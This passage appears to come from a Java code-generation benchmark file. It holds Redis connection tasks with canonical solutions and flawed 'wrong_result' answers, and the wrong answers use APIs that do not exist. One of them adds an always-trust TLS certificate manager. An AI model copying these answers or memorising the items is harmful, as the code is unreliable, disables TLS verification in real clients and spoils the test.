connection to first available host\n- createSocket() -> Socket - Creates and returns a configured socket (plain or SSL) to Redis server\n- getSocketHostAndPort() -> HostAndPort - Returns the effective host and port after applying any mapping",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLParameters;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.util.IOUtils;\n\npublic class DefaultJedisSocketFactory implements JedisSocketFactory {\n\n  protected static final HostAndPort DEFAULT_HOST_AND_PORT = new HostAndPort(Protocol.DEFAULT_HOST,\n      Protocol.DEFAULT_PORT);\n\n  private volatile HostAndPort hostAndPort = DEFAULT_HOST_AND_PORT;\n  private int connectionTimeout = Protocol.DEFAULT_TIMEOUT;\n  private int socketTimeout = Protocol.DEFAULT_TIMEOUT;\n  private boolean ssl = false;\n  private SSLSocketFactory sslSocketFactory = null;\n  private SSLParameters sslParameters = null;\n  private HostnameVerifier hostnameVerifier = null;\n  private HostAndPortMapper hostAndPortMapper = null;\n\n  public DefaultJedisSocketFactory() {\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n    this(hostAndPort, null);\n  }\n\n  public DefaultJedisSocketFactory(JedisClientConfig config) {\n    this(null, config);\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n    if (hostAndPort != null) {\n      this.hostAndPort = hostAndPort;\n    }\n    if (config != null) {\n      this.connectionTimeout = config.getConnectionTimeoutMillis();\n      this.socketTimeout = config.getSocketTimeoutMillis();\n      this.ssl = config.isSsl();\n      this.sslSocketFactory = config.getSslSocketFactory();\n      this.sslParameters = config.getSslParameters();\n      this.hostnameVerifier = config.getHostnameVerifier();\n      this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n  }\n\n  private Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) throws Exception {\n    List<InetAddress> hosts = Arrays.asList(InetAddress.getAllByName(hostAndPort.getHost()));\n    if (hosts.size() > 1) {\n      Collections.shuffle(hosts);\n    }\n\n    JedisConnectionException jce = new JedisConnectionException(\"Failed to connect to \" + hostAndPort + \".\");\n    for (InetAddress host : hosts) {\n      try {\n        Socket socket = new Socket();\n\n        socket.setReuseAddress(true);\n        socket.setKeepAlive(true);\n        socket.setTcpNoDelay(true);\n        socket.setSoLinger(true, 0);\n\n        socket.connect(new InetSocketAddress(host, hostAndPort.getPort()), connectionTimeout);\n        return socket;\n      } catch (Exception e) {\n        jce.addSuppressed(e);\n      }\n    }\n    throw jce;\n  }\n\n  @Override\n  public Socket createSocket() throws JedisConnectionException {\n    Socket socket = null;\n    try {\n      HostAndPort _hostAndPort = getSocketHostAndPort();\n      socket = connectToFirstSuccessfulHost(_hostAndPort);\n      socket.setSoTimeout(socketTimeout);\n\n      if (ssl) {\n        SSLSocketFactory _sslSocketFactory = this.sslSocketFactory;\n        if (null == _sslSocketFactory) {\n          _sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n        }\n        Socket plainSocket = socket;\n        socket = _sslSocketFactory.createSocket(socket, _hostAndPort.getHost(), _hostAndPort.getPort(), true);\n\n        if (null != sslParameters) {\n          ((SSLSocket) socket).setSSLParameters(sslParameters);\n        }\n        socket = new SSLSocketWrapper((SSLSocket) socket, plainSocket);\n\n        if (null != hostnameVerifier\n            && !hostnameVerifier.verify(_hostAndPort.getHost(), ((SSLSocket) socket).getSession())) {\n          String message = String.format(\n            \"The connection to '%s' failed ssl/tls hostname verification.\", _hostAndPort.getHost());\n          throw new JedisConnectionException(message);\n        }\n      }\n\n      return socket;\n\n    } catch (Exception ex) {\n      IOUtils.closeQuietly(socket);\n      if (ex instanceof JedisConnectionException) {\n        throw (JedisConnectionException) ex;\n      } else {\n        throw new JedisConnectionException(\"Failed to create socket.\", ex);\n      }\n    }\n  }\n\n  protected HostAndPort getSocketHostAndPort() {\n    HostAndPortMapper mapper = hostAndPortMapper;\n    HostAndPort hap = this.hostAndPort;\n    if (mapper != null) {\n      HostAndPort mapped = mapper.getHostAndPort(hap);\n      if (mapped != null) {\n        return mapped;\n      }\n    }\n    return hap;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class DefaultJedisSocketFactory {\n    private HostAndPort hostAndPort;\n    private int connectionTimeout;\n    private int socketTimeout;\n    private boolean ssl;\n    private SSLSocketFactory sslSocketFactory;\n    private SSLParameters sslParameters;\n    private HostnameVerifier hostnameVerifier;\n    private HostAndPortMapper hostAndPortMapper;\n\n    public DefaultJedisSocketFactory() {\n        this.hostAndPort = new HostAndPort(\"127.0.0.1\", 6379);\n        this.connectionTimeout = 2000;\n        this.socketTimeout = 2000;\n        this.ssl = false;\n        this.sslSocketFactory = null;\n        this.sslParameters = null;\n        this.hostnameVerifier = null;\n        this.hostAndPortMapper = null;\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = 2000;\n        this.socketTimeout = 2000;\n        this.ssl = false;\n        this.sslSocketFactory = null;\n        this.sslParameters = null;\n        this.hostnameVerifier = null;\n        this.hostAndPortMapper = null;\n    }\n\n    public DefaultJedisSocketFactory(JedisClientConfig config) {\n        this.hostAndPort = config.getHostAndPort();\n        this.connectionTimeout = config.getConnectionTimeout();\n        this.socketTimeout = config.getSocketTimeout();\n        this.ssl = config.isSsl();\n        this.sslSocketFactory = config.getSslSocketFactory();\n        this.sslParameters = config.getSslParameters();\n        this.hostnameVerifier = config.getHostnameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = config.getConnectionTimeout();\n        this.socketTimeout = config.getSocketTimeout();\n        this.ssl = config.isSsl();\n        this.sslSocketFactory = config.getSslSocketFactory();\n        this.sslParameters = config.getSslParameters();\n        this.hostnameVerifier = config.getHostnameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    private Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) {\n        return null;\n    }\n\n    public Socket createSocket() {\n        if (ssl) {\n            try {\n                SSLSocket socket = (SSLSocket) sslSocketFactory.createSocket();\n                socket.setSoTimeout(socketTimeout);\n                socket.setConnectTimeout(connectionTimeout);\n                socket.setSSLParameters(sslParameters);\n                socket.setHostnameVerifier(hostnameVerifier);\n                HostAndPort mapped = hostAndPortMapper.map(hostAndPort);\n                socket.connect(new InetSocketAddress(mapped.getHost(), mapped.getPort()));\n                return socket;\n            } catch (IOException e) {\n                throw new RuntimeException(e);\n            }\n        } else {\n            try {\n                Socket socket = new Socket();\n                socket.setSoTimeout(socketTimeout);\n                socket.setConnectTimeout(connectionTimeout);\n                HostAndPort mapped = hostAndPortMapper.map(hostAndPort);\n                socket.connect(new InetSocketAddress(mapped.getHost(), mapped.getPort()));\n                return socket;\n            } catch (IOException e) {\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    public HostAndPort getSocketHostAndPort() {\n        return hostAndPortMapper.map(hostAndPort);\n    }\n}"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis Sentinel instances and Redis masters via Sentinel, with support for SSL/TLS connections and custom DNS resolution.\n\nClass Description: The RedisSentinelConnector class facilitates connections to Redis Sentinel servers and Redis master instances through Sentinel, with configurable SSL/TLS options and custom DNS resolution capabilities.\n\nAttributes:\n- clientResources: [ClientResources] - The Lettuce client resources configuration including custom DNS resolver and other client settings\n\nMethods:\n- RedisSentinelConnector([ClientResources clientResources]) -> [RedisSentinelConnector] - Constructor that initializes the connector with custom client resources including DNS resolution configuration\n- connectToSentinelDirectly([String host]) -> [StatefulRedisSentinelConnection<String, String>] - Establishes a direct connection to a Redis Sentinel server with SSL/TLS (peer verification disabled)\n- connectToMasterViaSentinel([String host, String masterId, File truststore]) -> [StatefulRedisConnection<String, String>] - Connects to a Redis master via Sentinel with SSL/TLS using the specified truststore for certificate verification\n- closeConnection([AutoCloseable connection, RedisClient client]) -> [void] - Safely closes the given connection and shuts down the associated Redis client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.core.sentinel.api.StatefulRedisSentinelConnection;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisSentinelConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisURI redisURI = RedisURI.create(\"rediss://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT);\n        redisURI.setVerifyPeer(false);\n\n        RedisClient client = RedisClient.create(clientResources);\n        StatefulRedisSentinelConnection<String, String> connection = client.connectSentinel(redisURI);\n        return connection;\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT\n                + \"?sentinelMasterId=\" + masterId);\n        SslOptions options = SslOptions.builder().truststore(truststore).build();\n\n        RedisClient client = RedisClient.create(clientResources);\n        client.setOptions(ClientOptions.builder().sslOptions(options).build());\n        StatefulRedisConnection<String, String> connection = client.connect(redisURI);\n        return connection;\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        try {\n            if (connection != null) {\n                connection.close();\n            }\n        } finally {\n            if (client != null) {\n                FastShutdown.shutdown(client);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisSentinelConnector {\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisURI redisUri = RedisURI.create(\"redis://\" + host + \":26379?ssl=true\");\n        RedisClient redisClient = RedisClient.create(redisUri);\n        redisClient.setSSLContext(SSLContextBuilder.create()\n                .trustManager(new X509TrustManager() {\n                    @Override\n                    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n                        // Always trust\n                    }\n\n                    @Override\n                    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n                        // Always trust\n                    }\n\n                    @Override\n                    public X509Certificate[] getAcceptedIssuers() {\n                        return new X509Certificate[0];\n                    }\n                })\n                .build());\n        return redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        try {\n            RedisURI sentinelUri = RedisURI.create(\"redis://\" + host + \":26379?ssl=true\");\n            RedisClient sentinelClient = RedisClient.create(sentinelUri);\n            StatefulRedisSentinelConnection<String, String> sentinelConnection = sentinelClient.connect();\n            String masterAddress = sentinelConnection.sentinelGetMasterAddrByID(masterId);\n            if (masterAddress == null) {\n                throw new RuntimeException(\"Master not found in Sentinel\");\n            }\n            String[] parts = masterAddress.split(\":\");\n            if (parts.length != 2) {\n                throw new RuntimeException(\"Invalid master address format\");\n            }\n            String masterHost = parts[0];\n            int masterPort = Integer.parseInt(parts[1]);\n            RedisURI masterUri = RedisURI.create(\"redis://\" + masterHost + \":\" + masterPort + \"?ssl=true\");\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            try (FileInputStream fis = new FileInputStream(truststore)) {\n                keyStore.load(fis, null);\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to load truststore\", e);\n            }\n            TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n            tmf.init(keyStore);\n            TrustManager[] trustManagers = tmf.getTrustManagers();\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustManagers, null);\n            RedisClient masterClient = RedisClient.create(masterUri);\n            masterClient.setSSLContext(sslContext);\n            return masterClient.connect();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to connect to master via Sentinel\", e);\n        } finally {\n            if (sentinelClient != null) {\n                sentinelClient.shutdown();\n            }\n        }\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 326,
    "Instruction": "Task Description: Create a Redis connection manager class in Java that handles connection pooling and basic Redis operations using the Jedis client library.\n\nClass Description: The RedisConnectionManager class provides a convenient way to manage Redis connections using a connection pool and execute common Redis commands. It handles connection lifecycle and resource management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool instance that manages Redis connections\n\nMethods:\n- RedisConnectionManager(String host, int port, String username, String password) -> void - Constructor that initializes the Redis connection pool with the specified connection parameters\n- executeCommand(RedisCommand command) -> void - Executes the specified Redis command (SET, GET, or INCR) using a connection from the pool and stores the result in the command object for GET operations\n- close() -> void - Closes the connection pool and releases all resources\n- isClosed() -> boolean - Checks if the connection pool is closed",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisConnectionManager {\n\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, String username, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, username, password);\n    }\n\n    public void executeCommand(RedisCommand command) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            switch (command.getOperation()) {\n                case \"SET\":\n                    jedis.set(command.getKey(), command.getValue());\n                    break;\n                case \"GET\":\n                    String result = jedis.get(command.getKey());\n                    command.setResult(result);\n                    break;\n                case \"INCR\":\n                    jedis.incr(command.getKey());\n                    break;\n                default:\n                    throw new JedisException(\"Unsupported operation: \" + command.getOperation());\n            }\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null && !jedisPool.isClosed()) {\n            jedisPool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return jedisPool == null || jedisPool.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private JedisPool jedisPool;\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private boolean closed;\n\n    public RedisConnectionManager(String host, int port, String username, String password) {\n        this.host = host;\n        this.port = port;\n        this.username = username;\n        this.password = password;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 2000);\n    }\n\n    public void executeCommand(RedisCommand command) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            jedis.auth(username, password);\n            if (command.getType() == RedisCommandType.SET) {\n                jedis.set(command.getKey(), command.getValue());\n            } else if (command.getType() == RedisCommandType.GET) {\n                String result = jedis.get(command.getKey());\n                command.setResult(result);\n            } else if (command.getType() == RedisCommandType.INCR) {\n                Long result = jedis.incr(command.getKey());\n                command.setResult(result);\n            }\n        }\n    }\n\n    public void close() {\n        if (!closed) {\n            jedisPool.close();\n            closed = true;\n        }\n    }\n\n    public boolean isClosed() {\n        return closed;\n    }\n}"
  },
  {
    "Task_id": 327,
    "Instruction": "Task Description: Create a Java class that establishes a secure SSL/TLS connection to a Redis server using Lettuce client library, with support for SNI (Server Name Indication) and custom truststore configuration.\n\nClass Description: The RedisSSLConnection class provides a secure way to connect to a Redis server using SSL/TLS encryption. It handles SSL configuration including truststore setup and SNI support, and manages the Redis client lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) -> void - Constructor that initializes the Redis client with SSL configuration\n  - redisUri: String - Redis server URI (e.g., \"rediss://host:port\")\n  - hostName: String - The hostname for SNI\n  - truststorePath: String - Path to the truststore file\n  - truststorePassword: String - Password for the truststore\n- getConnection() -> StatefulRedisConnection<String, String> - Returns the established Redis connection\n- close() -> void - Closes the connection and shuts down the Redis client",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.SslOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport javax.net.ssl.SNIHostName;\nimport javax.net.ssl.SNIServerName;\nimport javax.net.ssl.SSLParameters;\nimport java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RedisSSLConnection {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) {\n        this.redisClient = RedisClient.create(redisUri);\n\n        List<SNIServerName> serverNames = new ArrayList<>();\n        serverNames.add(new SNIHostName(hostName));\n        \n        SslOptions sslOptions = SslOptions.builder()\n                .jdkSslProvider()\n                .truststore(new File(truststorePath), truststorePassword)\n                .sslParameters(() -> {\n                    SSLParameters parameters = new SSLParameters();\n                    parameters.setServerNames(serverNames);\n                    return parameters;\n                }).build();\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .sslOptions(sslOptions)\n                .build();\n        \n        redisClient.setOptions(clientOptions);\n        this.connection = redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisSSLConnection {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) {\n        try {\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.Type.JKS);\n            keyStore.load(new FileInputStream(truststorePath), truststorePassword.toCharArray());\n            TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n            tmf.init(keyStore);\n            TrustManager[] trustManagers = tmf.getTrustManagers();\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustManagers, null);\n\n            redisClient = RedisClient.builder()\n                    .ssl()\n                    .sslContext(sslContext)\n                    .sniHostName(hostName)\n                    .build();\n\n            RedisURI uri = RedisURI.create(redisUri);\n            connection = redisClient.connect(uri);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to establish SSL connection\", e);\n        }\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Java class that utilizes Java NIO's FileChannel to map a file into memory for read-only access, providing methods to access the mapped memory address and file size, and properly closing the channel when done.\n\nClass Description: The FileChannelProcessor class provides functionality to open a file using FileChannel, map it into memory in read-only mode, and expose the memory address and file size. It ensures proper resource cleanup by implementing a close method.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedAddress: long - The memory address where the file is mapped\nfileSize: long - The size of the mapped file in bytes\n\nMethods:\nFileChannelProcessor: [Constructor](String filePath) throws IOException - Initializes the FileChannel, maps the file into memory in read-only mode, and stores the memory address and file size\ngetMappedAddress: () -> long - Returns the memory address where the file is mapped\ngetFileSize: () -> long - Returns the size of the mapped file\nclose: () throws IOException - Closes the FileChannel to release system resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mappedAddress = fileChannel.map(MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        try (FileInputStream fis = new FileInputStream(filePath)) {\n            fileChannel = fis.getChannel();\n            fileSize = fileChannel.size();\n            MappedByteChannel mbc = fileChannel.map(MappedByteChannel.MapMode.READ_ONLY, 0, fileSize);\n            mappedAddress = mbc.address();\n        }\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Implement a Java class for interacting with Redis using the Lettuce client, including connection management and data operations.\n\nClass Description: The RedisInteraction class provides functionality to establish and manage a connection to a Redis server, perform bulk data operations, and clean up resources. It uses the Lettuce client library for Redis interactions.\n\nAttributes:\n- client: RedisClient - The Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active connection to the Redis server\n\nMethods:\n- initializeConnection() -> void - Initializes the Redis client and establishes a connection to the Redis server. Also clears all existing data in Redis.\n- closeConnection() -> void - Closes the Redis connection and shuts down the client to release resources.\n- createRedisPublisher(long elements) -> Publisher<String> - Creates and returns a Publisher that streams Redis keys. Populates Redis with test data (number of elements specified by input parameter) before creating the publisher. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.ScanStream;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RedisInteraction {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public void closeConnection() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n\n    public Publisher<String> createRedisPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n        sync.flushall();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        Map<String, String> map = new HashMap<>();\n        for (int i = 0; i < elements; i++) {\n            String element = \"RedisInteraction-\" + i;\n            map.put(element, element);\n\n            if (i % 1000 - 2020 == 0 && !map.isEmpty()) {\n                sync.mset(map);\n                map.clear();\n            }\n        }\n\n        if (!map.isEmpty()) {\n            sync.mset(map);\n            map.clear();\n        }\n\n        return ScanStream.scan(connection.reactive());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.reactive.RedisPubSubCommands;\nimport io.lettuce.core.api.reactive.ReactiveRedisClient;\nimport reactor.core.publisher.Flux;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class RedisInteraction {\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(\"redis://localhost:6379\");\n        connection = client.connect();\n        connection.sync().flushDb();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public Flux<String> createRedisPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n        AtomicLong counter = new AtomicLong(0);\n        for (long i = 0; i < elements; i++) {\n            String key = \"key\" + i;\n            String value = \"value\" + i;\n            connection.sync().set(key, value);\n        }\n        return connection.pubSub().subscribe(\"redis-keys\");\n    }\n}"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a multi-cluster Redis connection provider that manages connections to multiple Redis clusters with failover capabilities and connection pooling.\n\nClass Description: MultiClusterPooledConnectionProvider is a connection provider that maintains connections to multiple Redis clusters, allowing for cluster failover and providing pooled connections to improve performance. It uses a priority-based system to determine the active cluster and provides thread-safe access to connections.\n\nAttributes:\n- log: Logger - Logger instance for logging events and errors\n- multiClusterMap: Map<Integer, Cluster> - Concurrent map storing Redis clusters with their priority as key\n- activeMultiClusterIndex: Integer - Currently active cluster index (volatile for thread visibility)\n- activeClusterIndexLock: Lock - Reentrant lock for thread-safe modification of active cluster index\n- lastClusterCircuitBreakerForcedOpen: boolean - Flag indicating if circuit breaker was last forced open (volatile for thread visibility)\n\nMethods:\n- MultiClusterPooledConnectionProvider(MultiClusterClientConfig) -> void - Constructor that initializes the connection pools for all configured Redis clusters\n  Input: multiClusterClientConfig - Configuration object containing cluster settings\n  Throws: JedisValidationException if config is null\n\n- getConnection() -> Connection - Gets a connection from the currently active Redis cluster\n  Output: Connection object from the active cluster's pool\n\n- getConnection(int) -> Connection - Gets a connection from a specific Redis cluster by index\n  Input: multiClusterIndex - Priority index of the desired cluster\n  Output: Connection object from the specified cluster's pool\n\n- close() -> void - Closes the connection pool of the currently active cluster\n\nNested Class: Cluster\n- connectionPool: ConnectionPool - Pool of Redis connections for a specific cluster\n- getConnection() -> Connection - Gets a connection from this cluster's pool\n- getConnectionPool() -> ConnectionPool - Returns the connection pool instance",
    "Canonical_solution": "import io.github.resilience4j.circuitbreaker.CircuitBreaker;\nimport io.github.resilience4j.circuitbreaker.CircuitBreaker.State;\nimport io.github.resilience4j.retry.Retry;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport redis.clients.jedis.util.Pool;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider implements ConnectionProvider {\n\n    private final Logger log = LoggerFactory.getLogger(getClass());\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex = 1;\n    private final Lock activeClusterIndexLock = new ReentrantLock(true);\n    private volatile boolean lastClusterCircuitBreakerForcedOpen = false;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null)\n            throw new JedisValidationException(\"MultiClusterClientConfig must not be NULL for MultiClusterPooledConnectionProvider\");\n\n        ClusterConfig[] clusterConfigs = multiClusterClientConfig.getClusterConfigs();\n        for (ClusterConfig config : clusterConfigs) {\n            GenericObjectPoolConfig<Connection> poolConfig = config.getConnectionPoolConfig();\n            String clusterId = \"cluster:\" + config.getPriority() + \":\" + config.getHostAndPort();\n\n            if (poolConfig != null) {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig(), poolConfig)));\n            } else {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig())));\n            }\n        }\n    }\n\n    @Override\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    @Override\n    public void close() {\n        multiClusterMap.get(activeMultiClusterIndex).getConnectionPool().close();\n    }\n\n    public static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
